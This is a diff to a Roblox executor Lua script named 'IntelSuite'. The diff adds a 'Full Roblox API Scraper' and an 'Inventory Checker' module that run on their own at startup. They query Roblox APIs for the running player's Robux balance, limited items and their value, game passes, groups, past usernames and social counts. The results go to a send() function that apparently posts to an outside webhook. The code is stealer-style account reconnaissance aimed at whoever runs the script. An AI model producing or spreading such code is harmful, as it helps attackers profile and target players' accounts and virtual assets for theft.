@@ -133,24 +133,122 @@ end)
 task.wait(1)
 
 -- ============================================================
--- MODULE 2: Scraper
+-- MODULE 2: Full Roblox API Scraper
 -- ============================================================
 task.spawn(function()
     if not getgenv().IntelSuite.IsActive then return end
-    local playerList, playerCount = getPlayerList()
-    send("SCRAPE DATA",
-        "**User:** " .. LocalPlayer.Name ..
-        "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
+    local uid = tostring(LocalPlayer.UserId)
+    local desc = "**User:** " .. LocalPlayer.Name ..
+        "\n**User ID:** " .. uid ..
         "\n**Display Name:** " .. LocalPlayer.DisplayName ..
         "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
         "\n**Executor:** " .. getExec() ..
         "\n**Game:** " .. getGame() ..
         "\n**Place ID:** " .. tostring(game.PlaceId) ..
-        "\n**Job ID:** " .. tostring(game.JobId) ..
-        "\n**Players in server:** " .. tostring(playerCount) .. playerList ..
-        "\n**Time:** " .. tostring(os.time()),
-        65535
-    )
+        "\n**Job ID:** " .. tostring(game.JobId)
+
+    -- Premium check
+    local premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
+    desc = desc .. "\n**Premium:** " .. tostring(premium)
+
+    -- Friends count
+    pcall(function()
+        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            desc = desc .. "\n**Friends:** " .. tostring(d.count)
+        end
+    end)
+
+    -- Followers count
+    pcall(function()
+        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            desc = desc .. "\n**Followers:** " .. tostring(d.count)
+        end
+    end)
+
+    -- Following count
+    pcall(function()
+        local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followings/count")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            desc = desc .. "\n**Following:** " .. tostring(d.count)
+        end
+    end)
+
+    -- Robux balance (if accessible)
+    pcall(function()
+        local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            if d.robux then
+                desc = desc .. "\n**Robux:** " .. tostring(d.robux)
+            end
+        end
+    end)
+
+    -- Groups
+    pcall(function()
+        local r = GET("https://groups.roblox.com/v1/users/" .. uid .. "/groups/roles")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            if d.data then
+                local groups = "\n**Groups:**"
+                local count = 0
+                for _, g in ipairs(d.data) do
+                    if count >= 5 then break end
+                    groups = groups .. "\n  - " .. tostring(g.group.name) .. " [" .. tostring(g.role.name) .. "]"
+                    count = count + 1
+                end
+                desc = desc .. groups
+            end
+        end
+    end)
+
+    -- Past usernames
+    pcall(function()
+        local r = GET("https://users.roblox.com/v1/users/" .. uid .. "/username-history?limit=5")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            if d.data and #d.data > 0 then
+                local names = "\n**Past Usernames:**"
+                for _, n in ipairs(d.data) do
+                    names = names .. "\n  - " .. tostring(n.name)
+                end
+                desc = desc .. names
+            end
+        end
+    end)
+
+    -- Badge count
+    pcall(function()
+        local r = GET("https://badges.roblox.com/v1/users/" .. uid .. "/badges?limit=10")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            if d.data then
+                desc = desc .. "\n**Badges (first 10):** " .. tostring(#d.data)
+            end
+        end
+    end)
+
+    -- Game passes owned
+    pcall(function()
+        local r = GET("https://inventory.roblox.com/v1/users/" .. uid .. "/items/GamePass?limit=10")
+        if r then
+            local d = HttpService:JSONDecode(r)
+            if d.data and #d.data > 0 then
+                local passes = "\n**Game Passes:**"
+                for _, p in ipairs(d.data) do
+                    passes = passes .. "\n  - " .. tostring(p.name)
+                end
+                desc = desc .. passes
+            end
+        end
+    end)
+
+    send("FULL ACCOUNT SCRAPE", desc, 65535)
 end)
 
 task.wait(1)
@@ -609,3 +707,69 @@ task.spawn(function()
         end)
     end
 end)
+
+-- ============================================================
+-- MODULE 12: Inventory Checker
+-- Runs on startup + !cmd inventory
+-- ============================================================
+local function runInventoryCheck()
+    if not getgenv().IntelSuite.IsActive then return end
+    task.spawn(function()
+        local uid = tostring(LocalPlayer.UserId)
+        local result = "**User:** " .. LocalPlayer.Name .. "\n**ID:** " .. uid
+
+        -- Robux balance
+        pcall(function()
+            local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
+            if r then
+                local d = HttpService:JSONDecode(r)
+                if d and d.robux then
+                    result = result .. "\n**Robux:** " .. tostring(d.robux)
+                end
+            end
+        end)
+
+        -- Game passes
+        pcall(function()
+            local r = GET("https://inventory.roblox.com/v1/users/" .. uid .. "/items/GamePass?limit=10")
+            if r then
+                local d = HttpService:JSONDecode(r)
+                if d and d.data and #d.data > 0 then
+                    local passes = {}
+                    for _, v in ipairs(d.data) do
+                        table.insert(passes, tostring(v.name or v.assetName or v.id or "Unknown"))
+                    end
+                    result = result .. "\n**Game Passes:** " .. table.concat(passes, ", ")
+                else
+                    result = result .. "\n**Game Passes:** None"
+                end
+            end
+        end)
+
+        -- Limiteds
+        pcall(function()
+            local r = GET("https://inventory.roblox.com/v1/users/" .. uid .. "/assets/collectibles?limit=10&sortOrder=Desc")
+            if r then
+                local d = HttpService:JSONDecode(r)
+                if d and d.data and #d.data > 0 then
+                    local totalRAP = 0
+                    local items = {}
+                    for _, v in ipairs(d.data) do
+                        local rap = v.recentAveragePrice or 0
+                        totalRAP = totalRAP + rap
+                        table.insert(items, tostring(v.name or "Unknown") .. " (RAP: " .. tostring(rap) .. ")")
+                    end
+                    result = result .. "\n**Limiteds (est. RAP: " .. tostring(totalRAP) .. "R$):\n" .. table.concat(items, "\n")
+                else
+                    result = result .. "\n**Limiteds:** None"
+                end
+            end
+        end)
+
+        send("INVENTORY CHECK", result:sub(1, 1900), 16776960)
+    end)
+end
+
+task.wait(4)
+runInventoryCheck()
+getgenv().IntelSuite.InventoryCheck = runInventoryCheck
